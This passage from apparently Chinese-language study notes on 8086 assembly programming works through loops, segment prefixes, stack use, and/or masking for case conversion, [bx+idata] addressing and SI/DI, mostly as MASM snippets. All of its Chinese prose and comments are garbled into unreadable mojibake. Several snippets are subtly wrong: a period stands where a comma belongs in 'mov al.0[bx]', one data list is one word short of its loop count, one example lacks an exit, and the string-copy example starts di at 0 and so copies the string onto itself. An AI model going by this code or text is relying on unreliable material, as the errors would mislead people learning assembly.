cs:code<br>code segment<br>mov ax,0<br>mov cx,236<br>s:add ax,123<br>loop s<br>mov ax,4c00h<br>int 21h<br>code ends<br>end<br></code></pre></td></tr></table></figure><h3 id="5-5-loop-å’Œ-bx-çš„è”åˆåº”ç”¨"><a href="#5-5-loop-å’Œ-bx-çš„è”åˆåº”ç”¨" class="headerlink" title="5.5 loop å’Œ [bx] çš„è”åˆåº”ç”¨"></a>5.5 loop å’Œ [bx] çš„è”åˆåº”ç”¨</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs assembly">assume cs:code<br>code segment<br>mov ax,0ffffh<br>mov ds,ax<br>mov bx,0//åˆå§‹åŒ–ds:bxæŒ‡å‘ffff:0<br><br>mov dx,0//åˆå§‹åŒ–ç´¯åŠ å¯„å­˜å™¨dx,(dx)=0<br><br>mov cx,12//åˆå§‹åŒ–å¾ªç¯è®¡æ•°å¯„å­˜å™¨cx,(cx)=12<br><br>s:mov al,[bx]<br>mov ah,0<br>add dx,ax//é—´æ¥å‘dxä¸­åŠ ä¸Š((ds)*16+(bx))å•å…ƒçš„æ•°å€¼<br>inc bx//ds:bxæŒ‡å‘ä¸‹ä¸€ä¸ªå•å…ƒ<br>loop s<br><br>mov ax,4c00h<br>int 21h<br>code ends<br>end<br></code></pre></td></tr></table></figure><h3 id="5-6-æ®µå‰ç¼€"><a href="#5-6-æ®µå‰ç¼€" class="headerlink" title="5.6 æ®µå‰ç¼€"></a>5.6 æ®µå‰ç¼€</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov ax,ds:[bx]//å°†ä¸€ä¸ªå†…å­˜å•å…ƒå†…å®¹é€å…¥axï¼Œè¿™ä¸ªå†…å­˜å•å…ƒé•¿åº¦ä¸º2å­—èŠ‚ï¼Œå­˜æ”¾ä¸€ä¸ªå­—ï¼Œåç§»åœ°å€åœ¨bxä¸­ï¼Œæ®µåœ°å€åœ¨dsä¸­<br>cs:[bx]<br>ss:[bx]<br>es:[bx]<br>mov ax,ss:[0]//å°†ä¸€ä¸ªå†…å­˜å•å…ƒå†…å®¹é€å…¥axï¼Œè¿™ä¸ªå†…å­˜å•å…ƒé•¿åº¦ä¸º2å­—èŠ‚ï¼Œå­˜æ”¾ä¸€ä¸ªå­—ï¼Œåç§»åœ°å€ä¸º0ï¼Œæ®µåœ°å€åœ¨ssä¸­<br>cs:[0]<br></code></pre></td></tr></table></figure><p>æ®µå‰ç¼€ç”¨äºæ˜¾ç¤ºåœ°æŒ‡æ˜å†…å­˜å•å…ƒçš„æ®µåœ°å€ï¼Œå¦‚â€dsâ€,â€œcsâ€,â€œssâ€,â€œesâ€ç­‰</p><h3 id="5-7-ä¸€æ®µå®‰å…¨çš„ç©ºé—´"><a href="#5-7-ä¸€æ®µå®‰å…¨çš„ç©ºé—´" class="headerlink" title="5.7 ä¸€æ®µå®‰å…¨çš„ç©ºé—´"></a>5.7 ä¸€æ®µå®‰å…¨çš„ç©ºé—´</h3><ul><li>ç›´æ¥å‘ä¸€æ®µå†…å­˜å†™å…¥å†…å®¹</li><li>è¿™æ®µå†…å®¹ä¸åº”å­˜æ”¾ç³»ç»Ÿæˆ–å…¶ä»–ç¨‹åºçš„æ•°æ®æˆ–ä»£ç ,å¦åˆ™å†™å…¥æ“ä½œå¯èƒ½å¼•å‘é”™è¯¯</li><li>DOS æ–¹å¼ä¸‹ï¼Œä¸€èˆ¬æƒ…å†µï¼Œ0:200~0:2ff ç©ºé—´ä¸­æ²¡æœ‰ç³»ç»Ÿæˆ–å…¶ä»–ç¨‹åºçš„æ•°æ®æˆ–ä»£ç </li><li><strong>è¦ç›´æ¥å‘ä¸€æ®µå†…å­˜ä¸­å†™å…¥å†…å®¹æ—¶ï¼Œä½¿ç”¨ 0:200~0:2ff è¿™æ®µç©ºé—´</strong></li></ul><h3 id="5-8-æ®µå‰ç¼€çš„ä½¿ç”¨"><a href="#5-8-æ®µå‰ç¼€çš„ä½¿ç”¨" class="headerlink" title="5.8 æ®µå‰ç¼€çš„ä½¿ç”¨"></a>5.8 æ®µå‰ç¼€çš„ä½¿ç”¨</h3><p>e.g å°†å†…å­˜ ffff:0~fff:b å•å…ƒå¤„çš„æ•°æ®å¤åˆ¶åˆ° 0:200-0:20b å•å…ƒä¸­</p><ul><li><p>0:200-0:20b ç›¸å½“äº 0020:0-0020:b å•å…ƒ</p></li><li><p>åˆå§‹åŒ–ï¼šX&#x3D;0  å¾ªç¯12æ¬¡ï¼šå°†ffff:Xå•å…ƒçš„æ•°æ®é€å…¥ 0020:X     X&#x3D;X+1 </p></li><li><p>æºå§‹å•å…ƒ ffff:X å’Œç›®æ ‡å•å…ƒ 0020:X çš„åç§»åœ°å€Xæ˜¯å˜é‡ã€‚ç”¨ bx å­˜æ”¾</p></li><li><p>å°† 0:200-0:20b ç”¨ 0020:0-0020:b æè¿°ï¼Œä½¿ç›®æ ‡å•å…ƒçš„åç§»åœ°å€å’Œæºå§‹å•å…ƒçš„åç§»åœ°å€ä»åŒä¸€æ•°å€¼ 0 å¼€å§‹</p><p><strong>ä½¿ç”¨ä¸¤ä¸ªå¯„å­˜å™¨åˆ†åˆ«å­˜æ”¾æºå§‹å•å…ƒ ffff:X å’Œç›®æ ‡å•å…ƒ 0020:X çš„æ®µåœ°å€</strong></p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs assembly">assume cs:code<br>code segment<br>mov ax,0ffffh<br>mov ds,ax//(ds)=0ffffh<br><br>mov ax,0020h<br>mov es,ax//(es)=0020h<br><br>mov bx,0//(bx)=0,æ­¤æ—¶ds:bxæŒ‡å‘0fffh:0,es:bxæŒ‡å‘0020h:0<br><br>mov cx,12//(cx)=12<br><br>s:mov dl,[bx]//(dl)=((ds)*16+(bx)),å°†ffff:bxä¸­çš„æ•°æ®é€å…¥dl<br>mov es:[bx],dl//(es)*16+(bx)=(dl),å°†dlä¸­æ•°æ®é€å…¥0020:bx<br>inc bx//(bx)=(bx)+1<br>loop s<br><br>mov ax,4c00h<br>int 21h<br>code ends<br>end<br></code></pre></td></tr></table></figure><h1 id="å…­ã€åŒ…å«å¤šä¸ªæ®µçš„ç¨‹åº"><a href="#å…­ã€åŒ…å«å¤šä¸ªæ®µçš„ç¨‹åº" class="headerlink" title="å…­ã€åŒ…å«å¤šä¸ªæ®µçš„ç¨‹åº"></a>å…­ã€åŒ…å«å¤šä¸ªæ®µçš„ç¨‹åº</h1><h3 id="6-1-åœ¨ä»£ç å—ä¸­ä½¿ç”¨æ•°æ®"><a href="#6-1-åœ¨ä»£ç å—ä¸­ä½¿ç”¨æ•°æ®" class="headerlink" title="6.1 åœ¨ä»£ç å—ä¸­ä½¿ç”¨æ•°æ®"></a>6.1 åœ¨ä»£ç å—ä¸­ä½¿ç”¨æ•°æ®</h3><p>æ¡†æ¶</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs assembly">assume cs:code<br>code segment<br>:<br>æ•°æ®<br>:<br>start:<br>:<br>ä»£ç <br>:<br>code ends<br>end start<br></code></pre></td></tr></table></figure><p>e.g. è®¡ç®—ä»¥ä¸‹å…«ä¸ªæ•°æ®çš„å’Œï¼Œç»“æœå­˜åœ¨axå¯„å­˜å™¨ä¸­ï¼š0123hã€0456hã€0789hã€0abchã€0defhã€0fedhã€0cbahã€0987h</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs assembly">assume cs:code<br>code segment<br>dw 0123h,0456h,0789h,0abch,0defh,0fedh,0cbah,0987h//dwå®šä¹‰å­—å‹æ•°æ®ã€‚å³â€œdefine wordâ€<br>start:mov bx,0<br>mov ax,0<br><br>mov cx,8<br>s:add ax,cs:[bx]<br>add bx,2<br>loop s<br><br>mov ax,4c00h<br>            int 21h<br>code ends<br>end start<br></code></pre></td></tr></table></figure><h3 id="6-2-åœ¨ä»£ç æ®µä¸­ä½¿ç”¨æ ˆ"><a href="#6-2-åœ¨ä»£ç æ®µä¸­ä½¿ç”¨æ ˆ" class="headerlink" title="6.2 åœ¨ä»£ç æ®µä¸­ä½¿ç”¨æ ˆ"></a>6.2 åœ¨ä»£ç æ®µä¸­ä½¿ç”¨æ ˆ</h3><p>åˆ©ç”¨æ ˆï¼Œå°†æ•°æ®0123hã€0456hã€0789hã€0abchã€0defhã€0fedhã€0cbahã€0987hé€†åºå­˜æ”¾ï¼Œæ•°æ®å­˜æ”¾åœ¨cs:10-cs:2Få•å…ƒä¸­</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs assembly">assume cs:codesg<br>codesg segment<br>dw 0123h,0456h,0789h,0abch,0defh,0fedh,0cbah,0987h<br>dw 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0//ç”¨dwå®šä¹‰16ä¸ªå­—å‹æ•°æ®ï¼Œåœ¨ç¨‹åºåŠ è½½åï¼Œä¼šå–å¾—16ä¸ªå­—çš„å†…å­˜ç©ºé—´ï¼Œå­˜æ”¾è¿™16ä¸ªæ•°æ®ã€‚åé¢ç¨‹åºä¸­å°†è¿™æ®µç©ºé—´å½“ä½œæ ˆæ¥ä½¿ç”¨<br><br>start:mov ax,cs<br>mov ss,ax<br>mov sp,30h//å°†è®¾ç½®æ ˆé¡¶ss:spæŒ‡å‘cs:30<br><br>mov bx,0<br>mov cx,8<br>s:push cs:[bx]<br>add bx,2<br>loop s//ä»¥ä¸Šä»£ç 0-15å•å…ƒä¸­çš„8ä¸ªå­—ç¬¦æ•°æ®ä¾æ¬¡å…¥æ ˆ<br><br>mov bx,0<br>mov cx,8<br>s0:pop cs:[bx]<br>add bx,2<br>loop s0//ä¾æ¬¡å‡ºæ ˆ8ä¸ªå­—ç¬¦å‹æ•°æ®åˆ°ä»£ç æ®µ0-15å•å…ƒä¸­<br><br>mov ax,4c00h<br>int 21h<br>codesg ends<br>end start<br></code></pre></td></tr></table></figure><p>1.e.g ä¸‹é¢çš„ç¨‹åºä¾æ¬¡å®ç°ä½¿ç”¨å†…å­˜0:0-0:15å•å…ƒä¸­çš„å†…å®¹æ”¹å†™ç¨‹åºä¸­çš„æ•°æ®</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs assembly">assume cs:codesg<br>codesg segment<br>dw 0123h,0456h,0789h,0abch,0fedh,0cbah,0987h<br>start:mov ax,0<br>mov ds,ax<br>mov bx,0//ds=0,bx=0<br><br>mov cx,8<br>s:mov ax,[bx]//å°†ds:0æ•°æ®é€å…¥ax<br>mov cs:[bx],ax//(cs)*16+(bx)=(ax),å°†axæ•°æ®é€å…¥cs:0å¤„<br>add bx,2//cs:2<br>loop s<br><br>mov ax,4c00h<br>int 21h<br>codesg ends<br>end start<br></code></pre></td></tr></table></figure><p>ç”¨æ ˆæ¥è¿›è¡Œæ•°æ®ä¼ é€</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs assembly">assume cs:codesg<br>codesg segment<br>dw 0123h,0456h,0789h,0abch,0defh,0fedh,0cbah,0987h<br>dw 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0<br>start:mov ax,cs<br>mov ss,ax<br>mov sp,24h<br><br>mov ax,0<br>mov ds,ax<br>mov bx,0<br>mov cx,8<br>s:push [bx]<br>pop cs:[bx]<br>add bx,2<br>loop s<br><br>mov ax,4c00h<br>int 21h<br>codesg ends<br>end start<br></code></pre></td></tr></table></figure><h3 id="6-3-å°†æ•°æ®ã€ä»£ç ã€æ ˆæ”¾å…¥ä¸åŒçš„æ®µ"><a href="#6-3-å°†æ•°æ®ã€ä»£ç ã€æ ˆæ”¾å…¥ä¸åŒçš„æ®µ" class="headerlink" title="6.3 å°†æ•°æ®ã€ä»£ç ã€æ ˆæ”¾å…¥ä¸åŒçš„æ®µ"></a>6.3 å°†æ•°æ®ã€ä»£ç ã€æ ˆæ”¾å…¥ä¸åŒçš„æ®µ</h3><p>é€†åºå­˜æ”¾</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs assembly">assume cs:code,ds:data,ss:stack<br>data segment<br>dw 0123h,0456h,0789h,0abch,0defh,0fedh,0cbah,0987h<br>data ends<br>stack segment<br>dw 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0<br>stack ends<br>code segment<br>start:mov ax,stack<br>mov ss,ax<br>mov sp,20h//è®¾ç½®æ ˆé¡¶ss:spæŒ‡å‘stack:20<br><br>mov ax,data<br>mov ds,ax//dsæŒ‡å‘dataæ®µ<br><br>mov bx,0//ds:bxæŒ‡å‘dataæ®µä¸­ç¬¬ä¸€ä¸ªå•å…ƒ<br><br>mov cx,8<br>s:push [bx]<br>add bx,2<br>loop s//å°†dataæ®µä¸­0-15å•å…ƒä¸­çš„8ä¸ªå­—ç¬¦å‹æ•°æ®ä¾æ¬¡å…¥æ ˆ<br><br>mov bx,0<br><br>mov cx,8<br>s0:pop [bx]<br>add bx,2<br>loop s0//ä¾æ¬¡å‡ºæ ˆåˆ°dataæ®µçš„0-15å•å…ƒä¸­<br><br>mov ax,4c00h<br>int 21h<br>code ends<br>end start<br></code></pre></td></tr></table></figure><h1 id="ä¸ƒã€å®šä½å†…å­˜åœ°å€çš„æ–¹æ³•"><a href="#ä¸ƒã€å®šä½å†…å­˜åœ°å€çš„æ–¹æ³•" class="headerlink" title="ä¸ƒã€å®šä½å†…å­˜åœ°å€çš„æ–¹æ³•"></a>ä¸ƒã€å®šä½å†…å­˜åœ°å€çš„æ–¹æ³•</h1><h3 id="7-1-andå’ŒoræŒ‡ä»¤"><a href="#7-1-andå’ŒoræŒ‡ä»¤" class="headerlink" title="7.1 andå’ŒoræŒ‡ä»¤"></a>7.1 andå’ŒoræŒ‡ä»¤</h3><p>1ï¼‰and æŒ‡ä»¤ï¼šé€»è¾‘ä¸ï¼ŒæŒ‰ä½è¿›è¡Œä¸è¿ç®—ï¼ˆä¸¤ä¸ª1æ‰æ˜¯1ï¼‰</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov al,01100011B<br>and al,00111011B<br>ç»“æœ al=00100011B<br></code></pre></td></tr></table></figure><p>2ï¼‰or æŒ‡ä»¤ï¼šé€»è¾‘æˆ–ï¼ŒæŒ‰ä½è¿›è¡Œæˆ–è¿ç®—ï¼ˆæœ‰1å°±ä¸º1ï¼‰</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov al,01100011B<br>or  al,00111011B<br>ç»“æœ al=01111011B<br></code></pre></td></tr></table></figure><h3 id="7-3-ä»¥å­—ç¬¦å½¢å¼ç»™å‡ºçš„æ•°æ®"><a href="#7-3-ä»¥å­—ç¬¦å½¢å¼ç»™å‡ºçš„æ•°æ®" class="headerlink" title="7.3 ä»¥å­—ç¬¦å½¢å¼ç»™å‡ºçš„æ•°æ®"></a>7.3 ä»¥å­—ç¬¦å½¢å¼ç»™å‡ºçš„æ•°æ®</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs assembly">assume cs:code,ds:data<br>data segment<br>db &#x27;unIX&#x27;//ç›¸å½“äºâ€œdb 75H,6EH,49H,58Hâ€,dbå®šä¹‰å­—èŠ‚å˜é‡ï¼Œç±»ä¼¼dw<br>db &#x27;foRK&#x27;//ç›¸å½“äºâ€œdb 66H,6FH,52H,4BHâ€<br>data ends<br>code segment<br>start:mov al,&#x27;a&#x27;//mov al,61H<br>mov bl,&#x27;b&#x27;<br>mov ax,4c00h<br>int 21h<br>code ends<br>end start<br></code></pre></td></tr></table></figure><h3 id="7-4-å¤§å°å†™è½¬æ¢"><a href="#7-4-å¤§å°å†™è½¬æ¢" class="headerlink" title="7.4 å¤§å°å†™è½¬æ¢"></a>7.4 å¤§å°å†™è½¬æ¢</h3><p>åˆ¤æ–­æŸä¸€ä½ç½®æ˜¯ 0 è¿˜æ˜¯ 1</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs assembly">assume cs:codesg,ds:datasg<br>datasg segment<br>db &#x27;BaSiC&#x27;<br>db &#x27;iNfOrMaTiOn&#x27;<br>datasg ends<br>codesg segment<br> start:mov ax,datasg<br> mov ds,ax//è®¾ç½®dsæŒ‡å‘datasgæ®µ<br> <br>mov bx,0//è®¾ç½®(bx)=0,ds:bxæŒ‡å‘&#x27;BaSiC&#x27;çš„ç¬¬ä¸€ä¸ªå­—æ¯<br><br>mov cx,5//è®¾ç½®å¾ªç¯æ¬¡æ•°<br>     s:mov al,[bx]//å°†ASCIIç ä»ds:bxæ‰€æŒ‡å‘çš„å•å…ƒä¸­å–å‡º<br>and al,11011111B//å°†alä¸­çš„ASCIIç çš„ç¬¬äº”ä½ä¸º0ï¼Œå˜ä¸ºå¤§å†™å­—æ¯<br>mov [bx],al//è½¬æ¢åçš„ASCIIç å†™å›åŸå•å…ƒ<br>inc bx//ds:bxæŒ‡å‘ä¸‹ä¸€ä¸ªå­—æ¯<br>loop s<br><br>mov bx,5//(bx)=5,ds:bxæŒ‡å‘&#x27;iNfOrMaTiOn&#x27;çš„ç¬¬ä¸€ä¸ªå­—æ¯<br><br>mov cx,11<br>s0:mov al,[bx]<br>or al,00100000B//å°†alä¸­çš„ASCIIç ç¬¬5ä½ç½®ä¸º1ï¼Œå˜ä¸ºå°å†™å­—æ¯<br>mov [bx],al<br>inc bx<br>loop s0<br><br>mov ax,4c00h<br>int 21h<br>codesg ends<br>end start<br></code></pre></td></tr></table></figure><h3 id="7-5-bx-idata"><a href="#7-5-bx-idata" class="headerlink" title="7.5 [bx+idata]"></a>7.5 [bx+idata]</h3><p>[bx+idata] è¡¨ç¤ºä¸€ä¸ªå†…å­˜å•å…ƒï¼Œåç§»åœ°å€ä¸º (bx) + idata ( bxä¸­çš„æ•°å€¼åŠ ä¸Š idata )</p><p>mov ax,[bx+200] çš„å«ä¹‰:</p><ul><li>å°†ä¸€ä¸ªå†…å­˜å•å…ƒé€å…¥axï¼Œå†…å­˜å•å…ƒé•¿åº¦ä¸º 2 ä¸ªå­—èŠ‚ï¼ˆå­—å•å…ƒï¼‰ï¼Œå­˜æ”¾ä¸€ä¸ªå­—ï¼Œåç§»åœ°å€ä¸º bx ä¸­çš„æ•°å€¼åŠ ä¸Š200ï¼Œæ®µåœ°å€åœ¨dsä¸­</li><li>(ax)&#x3D;((ds)*16+(bx)+200)</li><li>mov ax,[200+bx]</li></ul><p>â€‹mov ax,200[bx]</p><p>â€‹mov ax,[bx].200</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs assembly">2000:1000 BE 00 06 00 00 00 ...<br>å†™å‡ºä¸‹é¢çš„ç¨‹åºæ‰§è¡Œåï¼Œaxã€bxã€cxä¸­çš„å†…å®¹<br>mov ax,2000H<br>mov ds,ax<br>mov bx,1000H<br><br>mov ax,[bx]//è®¿é—®çš„æ®µåœ°å€åœ¨dsä¸­ï¼Œ(ds)=2000H;åç§»åœ°å€åœ¨bxä¸­,(bx)=1000H;æŒ‡ä»¤æ‰§è¡Œå(ax)=00BEH<br><br>mov cx,[bx+1]//åç§»åœ°å€=(bx)+1=1001H;å(cx)=0600H<br><br>add cx,[bx+2]//åç§»åœ°å€=(bx)+2=1002H;å(cx)=0606H<br></code></pre></td></tr></table></figure><h3 id="7-6-ç”¨-bx-idata-çš„æ–¹å¼è¿›è¡Œæ•°ç»„çš„å¤„ç†"><a href="#7-6-ç”¨-bx-idata-çš„æ–¹å¼è¿›è¡Œæ•°ç»„çš„å¤„ç†" class="headerlink" title="7.6  ç”¨ [bx+idata] çš„æ–¹å¼è¿›è¡Œæ•°ç»„çš„å¤„ç†"></a>7.6  ç”¨ [bx+idata] çš„æ–¹å¼è¿›è¡Œæ•°ç»„çš„å¤„ç†</h3><p>å°† datasg ä¸­å®šä¹‰çš„ç¬¬ä¸€ä¸ªå­—ç¬¦ä¸²è½¬åŒ–ä¸ºå¤§å†™ï¼Œç¬¬äºŒä¸ªå­—ç¬¦ä¸²è½¬åŒ–ä¸ºå°å†™</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs assembly">assume cs:codesg,ds:datasg<br>datasg segment<br>db &#x27;BaSiC&#x27;<br>db &#x27;MinIX&#x27;<br>datasg ends<br>codesg segment<br> start:mov ax,datasg<br> mov ds,ax<br> mov bx,0<br> <br> mov cx,5<br> s:mov al.0[bx]<br> and al,11011111b<br> mov 0[bx],al<br> mov al,5[bx]([5+bx])<br> or al,00100000b<br> mov 5[bx]([5+bx]),al<br> inc bx<br> loop s<br>codesg ends<br>end start<br></code></pre></td></tr></table></figure><h3 id="7-7-SIå’ŒDI"><a href="#7-7-SIå’ŒDI" class="headerlink" title="7.7 SIå’ŒDI"></a>7.7 SIå’ŒDI</h3><p>si å’Œ di æ˜¯ 8086CPU ä¸­å’Œ bx åŠŸèƒ½ç›¸è¿‘çš„å¯„å­˜å™¨ï¼Œä¸èƒ½åˆ†æˆä¸¤ä¸ª 8 ä½å¯„å­˜å™¨æ¥ä½¿ç”¨</p><p>ä¸‹é¢ä¸‰ç»„å®ç°åŒä¸€åŠŸèƒ½</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov bx,0<br>mov ax,[bx]<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov si,0<br>mov ax,[si]<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov di,0<br>mov ax,[di]<br></code></pre></td></tr></table></figure><p>ä¸‹é¢ä¸‰ç»„å®ç°åŒä¸€åŠŸèƒ½</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov bx,0<br>mov ax,[di]<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov si,0<br>mov ax,[si+123]<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov di,0<br>mov ax,[di+123]<br></code></pre></td></tr></table></figure><p>e.g ç”¨ si å’Œ di å®ç°å°†å­—ç¬¦ä¸²â€™welcome to masm!â€™å¤åˆ¶åˆ°å®ƒåé¢çš„æ•°æ®ä¸­</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs assembly">assume cs:codesg,ds:datasg<br>datasg segment<br>db &#x27;welcome to masm!&#x27;<br>db &#x27;................&#x27;<br>datasg ends<br>codesg segment<br> start:mov ax,datasg<br> mov ds,ax<br> mov si,0<br> mov di,0<br> mov cx,8<br> s:mov ax,[si]<br> mov [di],ax<br> add si,2<br> add di,2<br> loop s<br> mov ax,4c00h<br> int 21h<br>codesg ends<br>end 